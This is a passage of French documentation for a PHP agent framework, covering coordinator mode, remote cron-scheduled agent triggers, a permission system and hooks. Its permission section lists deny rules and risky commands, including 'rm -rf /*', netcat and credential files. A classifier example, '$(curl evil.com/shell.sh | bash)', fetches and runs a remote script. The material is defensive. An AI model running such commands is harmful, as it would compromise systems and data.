use SuperAgent\Coordinator\CoordinatorMode;

// Créer le coordinateur
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Obtenir tous les outils
$allTools = $toolRegistry->getAll();

// Filtrer pour le coordinateur
$coordTools = $coordinator->filterCoordinatorTools($allTools);
$workerToolNames = $coordinator->getWorkerToolNames($allTools);

// Construire le prompt système
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $workerToolNames,
    scratchpadDir: '/tmp/scratchpad',
);

// Construire le contexte utilisateur
$userContext = $coordinator->getUserContext(
    workerToolNames: $workerToolNames,
    mcpToolNames: ['mcp_github_create_pr'],
    scratchpadDir: '/tmp/scratchpad',
);

// Configurer le moteur de requêtes avec les outils du coordinateur uniquement
$engine = new QueryEngine(
    provider: $provider,
    tools: $coordTools,
    systemPrompt: $systemPrompt,
    options: $options,
);
```

#### Anti-modèles à éviter

```php
// MAUVAIS : Le coordinateur délègue la compréhension
// "Based on your findings, fix the bug"
// Le coordinateur devrait LIRE les résultats et écrire une spécification précise.

// MAUVAIS : Prédire les résultats avant l'arrivée des notifications
// Ne présumez pas ce qu'un worker trouvera ; attendez la notification.

// MAUVAIS : Utiliser un worker pour vérifier un autre
// Utilisez TOUJOURS un worker FRAIS pour la vérification.

// MAUVAIS : Générer des workers sans contexte spécifique
// Incluez toujours les chemins de fichiers, numéros de lignes, types et justification.
```

### Quand utiliser le mode coordinateur

**Utilisez le mode coordinateur quand :**

- La tâche implique plusieurs fichiers ou sous-systèmes qui bénéficient d'une investigation parallèle
- Vous voulez une séparation stricte entre la planification et l'exécution
- La tâche nécessite un workflow recherche-puis-implémentation
- Vous avez besoin d'une vérification indépendante des changements
- Le codebase est large et les workers bénéficient d'un contexte ciblé

**Utilisez le mode normal (agent unique) quand :**

- La tâche est simple et bien définie (ex. corriger une faute de frappe, ajouter un import)
- La tâche ne touche qu'un ou deux fichiers
- La vitesse est plus importante qu'une investigation approfondie
- La conversation est interactive et nécessite des échanges rapides

### Dépannage

#### Le coordinateur essaie d'exécuter des outils directement

- Vérifiez que `filterCoordinatorTools()` a été appliqué à la liste d'outils avant de la passer au moteur.
- Vérifiez que seuls `Agent`, `SendMessage` et `TaskStop` sont dans la liste filtrée.

#### Les workers ne reçoivent pas le contexte complet

- Les prompts des workers doivent être autonomes. Incluez tous les chemins de fichiers, numéros de lignes, extraits de code et justification.
- Les workers ne peuvent pas voir la conversation du coordinateur. Ne faites pas référence à "le fichier dont nous avons discuté".

#### Décalage de mode de session après la reprise

- Appelez `matchSessionMode($storedMode)` lors de la reprise d'une session pour vous assurer que le mode coordinateur correspond.
- La méthode retourne une chaîne d'avertissement si un changement de mode a eu lieu.

#### Variable d'environnement non détectée

- Définissez `CLAUDE_CODE_COORDINATOR_MODE=1` ou `CLAUDE_CODE_COORDINATOR_MODE=true`.
- La vérification se fait dans le constructeur ; si vous créez l'objet avant de définir la variable d'environnement, elle ne sera pas détectée.

---

## 3. Tâches & Déclencheurs d'Agents Distants

> Exécutez des agents hors processus via l'API Anthropic, planifiez des tâches récurrentes avec des expressions cron, et gérez les déclencheurs programmatiquement. Les agents distants s'exécutent comme des sessions entièrement isolées avec des ensembles d'outils indépendants, des checkouts git et des connexions MCP optionnelles.

### Vue d'ensemble

Le système d'agents distants permet d'exécuter des tâches SuperAgent sur l'infrastructure d'Anthropic (ou une API compatible) sans maintenir une session locale active. Il se compose de :

- **`RemoteAgentTask`** -- Objet valeur représentant un déclencheur avec son ID, nom, expression cron, configuration de job, statut et connexions MCP.
- **`RemoteAgentManager`** -- Client API qui crée, liste, obtient, met à jour, exécute et supprime des déclencheurs via le point de terminaison `/v1/code/triggers`.
- **`RemoteTriggerTool`** -- Outil intégré pour déclencher des workflows distants depuis une conversation.
- **`ScheduleCronTool`** -- Outil intégré pour planifier des tâches basées sur cron depuis une conversation.

Les agents distants utilisent le format de job `ccr` (Claude Code Remote) et prennent en charge :
- Sélection de modèle personnalisé (par défaut : `claude-sonnet-4-6`)
- Listes blanches d'outils configurables
- Sources de dépôts git
- Connexions de serveurs MCP
- Planification cron avec conversion automatique du fuseau horaire vers UTC

### Configuration

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiBaseUrl: 'https://api.anthropic.com',  // ou point de terminaison personnalisé
    apiKey: env('ANTHROPIC_API_KEY'),
    organizationId: env('ANTHROPIC_ORG_ID'),  // optionnel
);
```

L'API utilise l'en-tête `anthropic-beta: ccr-triggers-2026-01-30` pour l'API des déclencheurs.

#### Outils autorisés par défaut

Les agents distants obtiennent ces outils par défaut : `Bash`, `Read`, `Write`, `Edit`, `Glob`, `Grep`.

### Utilisation

#### Créer un déclencheur

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiKey: getenv('ANTHROPIC_API_KEY'),
);

// Créer un déclencheur ponctuel (sans cron)
$trigger = $manager->create(
    name: 'Daily code review',
    prompt: 'Review all PRs opened in the last 24 hours and leave comments.',
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/my-repo.git',
);

echo $trigger->id;      // 'trig_abc123'
echo $trigger->status;  // 'idle'
```

#### Planification avec cron

```php
// Créer un déclencheur qui s'exécute chaque jour de semaine à 9h UTC
$trigger = $manager->create(
    name: 'Morning dependency check',
    prompt: 'Check for outdated dependencies and create issues for critical updates.',
    cronExpression: '0 9 * * 1-5',  // UTC
);

// Convertir le fuseau horaire local en UTC
$utcCron = RemoteAgentManager::cronToUtc('0 9 * * 1-5', 'America/New_York');
// '0 14 * * 1-5' (EST est UTC-5)

$trigger = $manager->create(
    name: 'Evening report',
    prompt: 'Generate a daily status report.',
    cronExpression: $utcCron,
);
```

#### Avec connexions MCP

```php
$trigger = $manager->create(
    name: 'Database health check',
    prompt: 'Use the database MCP server to check table sizes and index health.',
    mcpConnections: [
        [
            'name' => 'postgres-mcp',
            'type' => 'http',
            'url' => 'https://mcp.internal.example.com/postgres',
        ],
    ],
);
```

#### Gestion des déclencheurs

```php
// Lister tous les déclencheurs
$triggers = $manager->list();
foreach ($triggers as $trigger) {
    echo "{$trigger->name} ({$trigger->id}): {$trigger->status}\n";
    if ($trigger->cronExpression) {
        echo "  Cron : {$trigger->cronExpression}\n";
    }
    if ($trigger->lastRunAt) {
        echo "  Dernière exécution : {$trigger->lastRunAt}\n";
    }
}

// Obtenir un déclencheur spécifique
$trigger = $manager->get('trig_abc123');

// Mettre à jour un déclencheur
$updated = $manager->update('trig_abc123', [
    'enabled' => false,
    'cron_expression' => '0 10 * * 1-5',  // Changer à 10h
]);

// Exécuter un déclencheur immédiatement (contourner le planning cron)
$runResult = $manager->run('trig_abc123');

// Supprimer un déclencheur
$manager->delete('trig_abc123');
```

#### Utiliser les outils intégrés

Le `RemoteTriggerTool` et le `ScheduleCronTool` sont disponibles comme outils intégrés que le LLM peut invoquer pendant la conversation :

```php
use SuperAgent\Tools\Builtin\RemoteTriggerTool;
use SuperAgent\Tools\Builtin\ScheduleCronTool;

$remoteTrigger = new RemoteTriggerTool();
$result = $remoteTrigger->execute([
    'action' => 'create',
    'data' => [
        'name' => 'Weekly cleanup',
        'prompt' => 'Clean up stale branches.',
    ],
]);

$cronTool = new ScheduleCronTool();
$result = $cronTool->execute([
    'action' => 'create',
    'data' => [
        'name' => 'Nightly tests',
        'cron' => '0 2 * * *',
    ],
]);
```

### Référence API

#### `RemoteAgentTask`

| Propriété | Type | Description |
|----------|------|-------------|
| `id` | `string` | Identifiant unique du déclencheur |
| `name` | `string` | Nom lisible par un humain |
| `cronExpression` | `?string` | Expression cron (UTC) |
| `enabled` | `bool` | Si le déclencheur est actif |
| `taskType` | `string` | Type de tâche (par défaut : `remote-agent`) |
| `jobConfig` | `array` | Configuration complète du job CCR |
| `status` | `string` | Statut actuel (`idle`, `running`, etc.) |
| `createdAt` | `?string` | Horodatage de création |
| `lastRunAt` | `?string` | Horodatage de dernière exécution |
| `mcpConnections` | `array` | Connexions aux serveurs MCP |

| Méthode | Description |
|--------|-------------|
| `fromArray(array $data)` | (statique) Créer depuis une réponse API |
| `toArray()` | Sérialiser en tableau |

#### `RemoteAgentManager`

| Méthode | Retour | Description |
|--------|---------|-------------|
| `create(name, prompt, cron?, model?, tools?, gitUrl?, mcp?)` | `RemoteAgentTask` | Créer un déclencheur |
| `list()` | `RemoteAgentTask[]` | Lister tous les déclencheurs |
| `get(triggerId)` | `RemoteAgentTask` | Obtenir un déclencheur par ID |
| `update(triggerId, updates)` | `RemoteAgentTask` | Mettre à jour la configuration du déclencheur |
| `run(triggerId)` | `array` | Exécuter le déclencheur immédiatement |
| `delete(triggerId)` | `bool` | Supprimer un déclencheur |
| `cronToUtc(localCron, timezone)` | `string` | (statique) Convertir le cron en UTC |

#### `RemoteTriggerTool`

| Propriété | Valeur |
|----------|-------|
| Nom | `RemoteTriggerTool` |
| Catégorie | `automation` |
| Entrée | `action` (string), `data` (object) |
| Lecture seule | Non |

#### `ScheduleCronTool`

| Propriété | Valeur |
|----------|-------|
| Nom | `ScheduleCronTool` |
| Catégorie | `automation` |
| Entrée | `action` (string), `data` (object) |
| Lecture seule | Non |

### Exemples

#### Cycle de vie complet d'un déclencheur

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(apiKey: getenv('ANTHROPIC_API_KEY'));

// Créer
$trigger = $manager->create(
    name: 'PR Review Bot',
    prompt: 'Review all open PRs. For each PR, check code quality, test coverage, and leave constructive comments.',
    cronExpression: '0 8 * * 1-5',  // 8h UTC jours de semaine
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/backend.git',
);

echo "Déclencheur créé : {$trigger->id}\n";

// Le tester immédiatement
$result = $manager->run($trigger->id);
echo "Résultat de l'exécution : " . json_encode($result) . "\n";

// Vérifier le statut
$updated = $manager->get($trigger->id);
echo "Statut : {$updated->status}\n";
echo "Dernière exécution : {$updated->lastRunAt}\n";

// Désactiver pendant la maintenance
$manager->update($trigger->id, ['enabled' => false]);

// Réactiver
$manager->update($trigger->id, ['enabled' => true]);

// Nettoyer
$manager->delete($trigger->id);
```

#### Conversion de fuseau horaire

```php
use SuperAgent\Remote\RemoteAgentManager;

// Convertir "9h Eastern" en cron UTC
$utc = RemoteAgentManager::cronToUtc('0 9 * * *', 'America/New_York');
// Résultat : '0 14 * * *' (pendant EST, UTC-5)

// Tokyo 15h quotidien
$utc = RemoteAgentManager::cronToUtc('0 15 * * *', 'Asia/Tokyo');
// Résultat : '0 6 * * *' (JST est UTC+9)
```

### Dépannage

| Problème | Cause | Solution |
|---------|-------|----------|
| "Remote API error (401)" | Clé API invalide | Vérifiez `ANTHROPIC_API_KEY` |
| "Remote API error (403)" | ID d'organisation manquant ou permissions insuffisantes | Définissez le paramètre `organizationId` |
| Le déclencheur ne s'exécute pas | `enabled` est false | Mettez à jour le déclencheur avec `['enabled' => true]` |
| Le planning cron est décalé de quelques heures | Fuseau horaire non converti | Utilisez `cronToUtc()` pour convertir les heures locales |
| La connexion MCP échoue | Le serveur MCP n'est pas accessible depuis le distant | Assurez-vous que le serveur MCP a un point de terminaison public |
| Expression cron non standard rejetée | Expression cron invalide | Utilisez le cron standard à 5 champs (minute heure jour mois jour_semaine) |

---

## 4. Système de Permissions

> Contrôlez quels outils et commandes l'agent peut exécuter via 6 modes de permissions, des règles configurables, une classification des commandes bash et une intégration avec les guardrails et les hooks.

### Vue d'ensemble

Le Système de Permissions est le gardien de chaque invocation d'outil. Il évalue un pipeline de décision multi-étapes qui vérifie les règles de refus, les guardrails, la classification de sécurité bash, la logique spécifique aux outils et les politiques basées sur le mode. Le résultat est toujours l'un des trois comportements : **autoriser**, **refuser** ou **demander** (inviter l'utilisateur).

Classes principales :

| Classe | Rôle |
|---|---|
| `PermissionEngine` | Moteur de décision central avec pipeline d'évaluation en 6 étapes |
| `PermissionMode` | Enum de 6 modes de permissions |
| `PermissionRule` | Une seule règle autoriser/refuser/demander avec nom d'outil et modèle de contenu |
| `PermissionRuleParser` | Analyse les chaînes de règles comme `Bash(git *)` en `PermissionRuleValue` |
| `PermissionRuleValue` | Règle analysée : nom d'outil + modèle de contenu optionnel |
| `BashCommandClassifier` | Classifie les commandes bash par niveau de risque et catégorie |
| `PermissionDecision` | Le résultat : autoriser/refuser/demander avec raison et suggestions |
| `PermissionDenialTracker` | Suit l'historique des refus pour l'analytique |

### Modes de permissions

Le système prend en charge 6 modes qui déterminent la posture globale des permissions :

| Mode | Valeur Enum | Comportement |
|---|---|---|
| **Par défaut** | `default` | Les règles standard s'appliquent ; les actions non correspondantes invitent l'utilisateur |
| **Plan** | `plan` | Même les actions autorisées nécessitent une approbation explicite |
| **Accepter les modifications** | `acceptEdits` | Auto-autorise les outils d'édition de fichiers (Edit, MultiEdit, Write, NotebookEdit) |
| **Contourner les permissions** | `bypassPermissions` | Auto-autorise tout (dangereux) |
| **Ne pas demander** | `dontAsk` | N'invite jamais ; refuse automatiquement tout ce qui aurait été "demander" |
| **Auto** | `auto` | Utilise un classificateur automatique pour décider autoriser/refuser pour les actions "demander" |

```php
use SuperAgent\Permissions\PermissionMode;

$mode = PermissionMode::DEFAULT;
echo $mode->getTitle();   // "Standard Permissions"
echo $mode->getSymbol();  // Emoji cadenas
echo $mode->getColor();   // "green"
echo $mode->isHeadless(); // false (seuls DONT_ASK et AUTO sont headless)
```

### Configuration

#### Règles de permissions dans les paramètres

Les règles sont configurées dans `settings.json` sous trois listes :

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(npm test*)",
      "Read",
      "Glob",
      "Grep"
    ],
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(sudo *)",
      "Write(.env*)"
    ],
    "ask": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### Syntaxe des règles

Les règles suivent le format `ToolName` ou `ToolName(content-pattern)` :

| Règle | Correspond à |
|---|---|
| `Bash` | Tous les appels à l'outil Bash |
| `Bash(git status*)` | Les commandes Bash commençant par `git status` |
| `Bash(npm install*)` | Les commandes Bash commençant par `npm install` |
| `Read` | Tous les appels à l'outil Read |
| `Write(.env*)` | Les appels Write vers des fichiers commençant par `.env` |
| `Edit(/etc/*)` | Les appels Edit vers des fichiers commençant par `/etc/` |

Caractères joker : Un `*` final correspond à tout suffixe (correspondance de préfixe). Sans `*`, la règle nécessite une correspondance exacte.

Les caractères spéciaux `(`, `)` et `\` peuvent être échappés avec un antislash.

```php
use SuperAgent\Permissions\PermissionRuleParser;
use SuperAgent\Permissions\PermissionRuleValue;

$parser = new PermissionRuleParser();

$rule = $parser->parse('Bash(git status*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'git status*'

$rule = $parser->parse('Read');
// $rule->toolName === 'Read'
// $rule->ruleContent === null (correspond à tous les appels Read)

$rule = $parser->parse('Bash(npm install*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'npm install*'
```

#### Correspondance de PermissionRule

```php
use SuperAgent\Permissions\PermissionRule;
use SuperAgent\Permissions\PermissionRuleSource;
use SuperAgent\Permissions\PermissionBehavior;
use SuperAgent\Permissions\PermissionRuleValue;

$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Bash', 'git *'),
);

$rule->matches('Bash', 'git status');       // true
$rule->matches('Bash', 'git push origin');  // true
$rule->matches('Bash', 'npm install');      // false
$rule->matches('Read', 'file.txt');         // false

// Règle sans modèle de contenu correspond à toutes les invocations de cet outil
$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Read'),
);

$rule->matches('Read', '/any/file.txt');    // true
$rule->matches('Read', null);               // true
```

### Utilisation

#### Créer un PermissionEngine

```php
use SuperAgent\Permissions\PermissionEngine;
use SuperAgent\Permissions\PermissionContext;
use SuperAgent\Permissions\PermissionMode;

$context = new PermissionContext(
    mode: PermissionMode::DEFAULT,
    alwaysAllowRules: $allowRules,   // PermissionRule[]
    alwaysDenyRules: $denyRules,     // PermissionRule[]
    alwaysAskRules: $askRules,       // PermissionRule[]
);

$engine = new PermissionEngine(
    callback: $permissionCallback,    // PermissionCallbackInterface
    context: $context,
    guardrailsEngine: $guardrailsEngine, // optionnel
);
```

#### Vérifier les permissions

```php
$decision = $engine->checkPermission($tool, $input);

switch ($decision->behavior) {
    case PermissionBehavior::ALLOW:
        // Exécuter l'outil
        break;

    case PermissionBehavior::DENY:
        echo "Refusé : {$decision->message}\n";
        echo "Raison : {$decision->reason->type}\n";
        break;

    case PermissionBehavior::ASK:
        // Afficher l'invite de permission avec des suggestions
        echo "Permission nécessaire : {$decision->message}\n";
        foreach ($decision->suggestions as $suggestion) {
            echo "  - {$suggestion->label}\n";
        }
        break;
}
```

### Pipeline de décision

La méthode `PermissionEngine::checkPermission()` suit un pipeline d'évaluation en 6 étapes :

#### Étape 1 : Permissions basées sur les règles (immunisées contre le contournement)

Vérifie d'abord les règles de refus, puis les règles de demande. Celles-ci ne peuvent pas être remplacées par un mode quelconque.

- **Règles de refus** : Si correspondance, retourne immédiatement `deny`
- **Règles de demande** : Si correspondance, retourne `ask`
- **Chemins dangereux** : Vérifie les chemins sensibles (`.git/`, `.env`, `.ssh/`, `credentials`, `/etc/`, etc.)

#### Étape 1.5 : Évaluation du DSL Guardrails

Si un `GuardrailsEngine` est configuré, évalue les règles de guardrails contre un `RuntimeContext`. Les résultats de guardrails qui correspondent à des actions de permission (`deny`, `allow`, `ask`) sont utilisés ; les actions non liées aux permissions (`warn`, `log`, `downgrade_model`) passent au travers.

#### Étape 2 : Classification des commandes Bash

Pour les appels à l'outil Bash (quand la fonctionnalité expérimentale `bash_classifier` est activée), le `BashCommandClassifier` évalue la commande :

- **Risque critique/élevé** : Retourne `ask` avec la raison du risque
- **Approbation requise** : Retourne `ask` dans les modes sans contournement
- **Risque faible** : Passe au travers (n'auto-autorise pas)

#### Étape 3 : Exigences d'interaction de l'outil

Si l'outil déclare `requiresUserInteraction()`, retourne `ask`.

#### Étape 4 : Autorisation basée sur le mode

- **Mode contournement** : Retourne `allow` pour tout
- **Mode accepter les modifications** : Retourne `allow` pour les outils d'édition (Edit, MultiEdit, Write, NotebookEdit)

#### Étape 5 : Règles d'autorisation

Vérifie la liste des règles d'autorisation. Si correspondance, retourne `allow`.

#### Étape 6 : Par défaut

Si rien d'autre ne correspond, retourne `ask` avec des suggestions générées pour l'utilisateur.

#### Transformations de mode

Après que le pipeline produit une décision, des transformations spécifiques au mode sont appliquées :

| Mode | Transformation |
|---|---|
| **Ne pas demander** | Les décisions `ask` deviennent `deny` (refus automatique) |
| **Plan** | Les décisions `allow` deviennent `ask` (nécessite approbation explicite) |
| **Auto** | Les décisions `ask` sont routées vers un classificateur automatique qui retourne `allow` ou `deny` |

### Classification des commandes Bash

Le `BashCommandClassifier` analyse les commandes shell en deux phases :

#### Phase 1 : Validateur de sécurité (23 vérifications)

Le `BashSecurityValidator` effectue 23 vérifications individuelles de sécurité. Si une vérification échoue, la commande est classifiée comme risque `critical` avec la catégorie `security`.

#### Phase 2 : Analyse de la commande

| Niveau de risque | Catégories | Exemples |
|---|---|---|
| **critical** | `security`, `destructive`, `privilege` | Violations de sécurité, `dd`, `mkfs`, `sudo`, `su` |
| **high** | `destructive`, `permission`, `process`, `network`, `complex`, `dangerous-pattern` | `rm`, `chmod`, `chown`, `kill`, `nc`, substitutions de commandes |
| **medium** | `destructive`, `network`, `unknown` | `mv`, `curl`, `wget`, `ssh`, commandes non reconnues |
| **low** | `safe`, `empty` | `git status`, `ls`, `cat`, `echo`, `pwd` |

Préfixes de commandes sûres (toujours risque faible) :
```
git status, git diff, git log, git branch, git show
npm list, npm view, npm info
yarn list, yarn info
composer show
pip list, pip show
docker ps, docker images, docker logs
ls, cat, echo, pwd, which, whoami, date, env, printenv
```

Commandes dangereuses avec niveaux de risque :

| Commande | Risque | Catégorie |
|---|---|---|
| `rm` | high | destructive |
| `mv` | medium | destructive |
| `chmod` | high | permission |
| `chown` | high | permission |
| `sudo` | critical | privilege |
| `su` | critical | privilege |
| `kill`, `pkill`, `killall` | high | process |
| `dd`, `mkfs`, `fdisk`, `format` | critical | destructive |
| `curl`, `wget` | medium | network |
| `nc`, `netcat` | high | network |
| `ssh`, `scp` | medium | network |

Les commandes avec des substitutions, expansions, pipes ou opérateurs de flux de contrôle sont classifiées comme risque `high` / `complex`.

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

$result = $classifier->classify('git status');
// risk: 'low', category: 'safe', prefix: 'git status'

$result = $classifier->classify('rm -rf /tmp/old');
// risk: 'high', category: 'destructive', prefix: 'rm -rf'

$result = $classifier->classify('$(curl evil.com/shell.sh | bash)');
// risk: 'critical', category: 'security' (capturé par le validateur de sécurité)

$result->isHighRisk();        // true pour high + critical
$result->requiresApproval();  // true pour medium + high + critical

// Vérification lecture seule
$classifier->isReadOnly('cat file.txt');    // true
$classifier->isReadOnly('rm file.txt');     // false
```

#### CommandClassification

| Propriété | Type | Description |
|---|---|---|
| `$risk` | `string` | `low`, `medium`, `high`, `critical` |
| `$category` | `string` | `safe`, `destructive`, `permission`, `privilege`, `process`, `network`, `complex`, `dangerous-pattern`, `security`, `unknown`, `empty` |
| `$prefix` | `?string` | Préfixe de commande extrait (ex. `git status`) |
| `$isTooComplex` | `bool` | Vrai si la commande contient des substitutions/pipes/flux de contrôle |
| `$reason` | `?string` | Raison lisible par un humain de la classification |
| `$securityCheckId` | `?int` | ID numérique de la vérification de sécurité qui a échoué |

### Intégration avec les hooks

Les hooks peuvent influencer les décisions de permissions via `HookResult` :

```php
// Dans un hook PreToolUse :
// Allow contourne l'invite de permission (mais PAS les règles de refus)
return HookResult::allow(reason: 'Pré-approuvé par le CI');

// Deny bloque l'appel d'outil
return HookResult::deny('Bloqué par la politique d\'entreprise');

// Ask force une invite de permission
return HookResult::ask('Cette action nécessite une approbation humaine');
```

Lors de la fusion, la priorité est : **deny > ask > allow**.

### Intégration avec les guardrails

Le `PermissionEngine` s'intègre avec le `GuardrailsEngine` à l'étape 1.5 :

```php
use SuperAgent\Guardrails\GuardrailsConfig;
use SuperAgent\Guardrails\GuardrailsEngine;
use SuperAgent\Guardrails\Context\RuntimeContextCollector;

$guardrailsEngine = new GuardrailsEngine(
    GuardrailsConfig::fromYamlFile('guardrails.yaml')
);

$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setRuntimeContextCollector($contextCollector);
```

L'évaluation du DSL guardrails se fait après les règles de refus/demande codées en dur mais avant la classification bash, vous donnant un contrôle fin piloté par YAML sur les permissions.

### Suggestions de permissions

Quand le moteur retourne `ask`, il génère des suggestions `PermissionUpdate` pour aider l'utilisateur à créer des règles permanentes :

```php
$decision = $engine->checkPermission($tool, $input);

foreach ($decision->suggestions as $suggestion) {
    echo "{$suggestion->label}\n";
    // Exemples :
    // "Autoriser cette action spécifique"
    // "Autoriser les commandes 'git'"
    // "Autoriser toutes les actions Bash"
    // "Entrer en mode contournement (dangereux)"
}
```

Les suggestions incluent :
1. Autoriser l'action exacte (correspondance complète du contenu)
2. Autoriser le préfixe de commande avec joker
3. Autoriser toutes les invocations de l'outil
4. Entrer en mode contournement

### Référence API

#### `PermissionEngine`

| Méthode | Description |
|---|---|
| `__construct(PermissionCallbackInterface $callback, PermissionContext $context, ?GuardrailsEngine $guardrailsEngine)` | Créer le moteur |
| `checkPermission(Tool $tool, array $input): PermissionDecision` | Évaluer la permission pour un appel d'outil |
| `getContext(): PermissionContext` | Obtenir le contexte actuel |
| `setContext(PermissionContext $context): void` | Mettre à jour le contexte (ex. changer de mode) |
| `setGuardrailsEngine(?GuardrailsEngine $engine): void` | Définir/supprimer l'intégration guardrails |
| `setRuntimeContextCollector(?RuntimeContextCollector $collector): void` | Définir le collecteur de contexte pour les guardrails |
| `getDenialTracker(): PermissionDenialTracker` | Obtenir l'historique de suivi des refus |

#### `PermissionMode` (enum)

| Cas | Valeur | Headless ? | Description |
|---|---|---|---|
| `DEFAULT` | `default` | Non | Règles de permission standard |
| `PLAN` | `plan` | Non | Nécessite approbation explicite pour toutes les actions |
| `ACCEPT_EDITS` | `acceptEdits` | Non | Auto-autorise les outils d'édition de fichiers |
| `BYPASS_PERMISSIONS` | `bypassPermissions` | Non | Auto-autorise tout |
| `DONT_ASK` | `dontAsk` | Oui | Refuse automatiquement tout ce qui inviterait |
| `AUTO` | `auto` | Oui | Utilise un classificateur automatique pour les décisions |

#### `PermissionRule`

| Méthode | Description |
|---|---|
| `matches(string $toolName, ?string $content): bool` | Vérifier si la règle correspond à un appel d'outil |
| `toString(): string` | Représentation en chaîne |

#### `PermissionRuleParser`

| Méthode | Description |
|---|---|
| `parse(string $rule): PermissionRuleValue` | Analyser une chaîne de règle en nom d'outil + modèle de contenu |

#### `BashCommandClassifier`

| Méthode | Description |
|---|---|
| `classify(string $command): CommandClassification` | Classifier une commande bash |
| `isReadOnly(string $command): bool` | Vérifier si une commande est en lecture seule |

### Exemples

#### Configuration typique de projet

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(git branch*)",
      "Bash(npm test*)",
      "Bash(npm run lint*)",
      "Bash(composer test*)",
      "Bash(php artisan test*)",
      "Bash(ls *)",
      "Bash(cat *)",
      "Bash(pwd)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)",
      "Bash(chmod 777*)",
      "Write(.env*)",
      "Write(credentials*)"
    ],
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)",
      "Bash(npm publish*)",
      "Bash(curl *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### Configuration headless CI/CD

```json
{
  "permissions": {
    "mode": "dontAsk",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Write",
      "Edit",
      "Bash(git *)",
      "Bash(npm *)",
      "Bash(composer *)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)"
    ]
  }
}
```

### Dépannage

**L'outil est toujours refusé** -- Vérifiez d'abord les règles de refus ; elles sont immunisées contre le contournement et évaluées avant tout le reste. Vérifiez aussi si le mode `dontAsk` est actif (convertit tous les `ask` en `deny`).

**L'outil demande toujours** -- En mode `plan`, même les actions autorisées deviennent `ask`. Vérifiez le mode actif avec `$engine->getContext()->mode`.

**Les commandes Bash sont mal classifiées** -- Le classificateur traite toute commande avec `$()`, backticks, pipes, `&&`, `||` ou `;` comme "trop complexe" et assigne un risque `high`. C'est intentionnel pour la sécurité.

**Les guardrails ne sont pas évalués** -- Les deux méthodes `setGuardrailsEngine()` et `setRuntimeContextCollector()` doivent être définies pour que les guardrails participent au pipeline de décision.

**Les suggestions de permissions n'apparaissent pas** -- Les suggestions ne sont générées que pour les décisions `ask`. Les décisions `allow` et `deny` n'incluent pas de suggestions.

**Erreur "Empty permission rule"** -- La chaîne de règle passée à `PermissionRuleParser::parse()` est vide ou ne contient que des espaces.

---

## 5. Système de Hooks

> Interceptez et contrôlez le comportement de l'agent à chaque étape -- de l'exécution des outils au cycle de vie de la session -- en utilisant des hooks composables et configurables qui peuvent autoriser, refuser, modifier ou observer les opérations.

### Vue d'ensemble

Le Système de Hooks fournit un pipeline de type middleware pour intercepter les événements de l'agent. Les hooks sont organisés par type d'événement et correspondent aux noms d'outils en utilisant la même syntaxe de règles que le Système de Permissions. Chaque hook produit un `HookResult` qui peut continuer l'exécution, l'arrêter, modifier les entrées d'outils, injecter des messages système ou contrôler le comportement des permissions.

Classes principales :

| Classe | Rôle |
|---|---|
| `HookRegistry` | Registre central : enregistre les hooks, les exécute pour les événements, gère le cycle de vie |
| `HookEvent` | Enum de 21 événements hookables |
| `HookType` | Enum des types d'implémentation de hooks (command, prompt, http, agent, callback, function) |
| `HookInput` | Charge utile d'entrée immuable passée aux hooks |
| `HookResult` | Résultat de l'exécution du hook avec des directives de flux de contrôle |
| `HookMatcher` | Fait correspondre les hooks aux invocations d'outils en utilisant la syntaxe des règles de permissions |
| `StopHooksPipeline` | Pipeline spécialisé pour les hooks OnStop/TaskCompleted/TeammateIdle |

### Événements de hook

#### Événements de cycle de vie

| Événement | Valeur | Description |
|---|---|---|
| `SessionStart` | `SessionStart` | Déclenché quand une nouvelle session commence |
| `SessionEnd` | `SessionEnd` | Déclenché quand une session se termine |
| `OnStop` | `OnStop` | Déclenché quand l'agent s'arrête |
| `OnQuery` | `OnQuery` | Déclenché quand une requête est reçue |
| `OnMessage` | `OnMessage` | Déclenché quand un message est reçu |
| `OnThinkingComplete` | `OnThinkingComplete` | Déclenché quand la pensée étendue se termine |

#### Événements d'exécution d'outils

| Événement | Valeur | Description |
|---|---|---|
| `PreToolUse` | `PreToolUse` | Déclenché avant l'exécution d'un outil |
| `PostToolUse` | `PostToolUse` | Déclenché après l'exécution réussie d'un outil |
| `PostToolUseFailure` | `PostToolUseFailure` | Déclenché quand l'exécution d'un outil échoue |

#### Événements de permissions

| Événement | Valeur | Description |
|---|---|---|
| `PermissionRequest` | `PermissionRequest` | Déclenché quand une permission est demandée |
| `PermissionDenied` | `PermissionDenied` | Déclenché quand une permission est refusée |

#### Événements d'interaction utilisateur

| Événement | Valeur | Description |
|---|---|---|
| `UserPromptSubmit` | `UserPromptSubmit` | Déclenché quand l'utilisateur soumet un prompt |
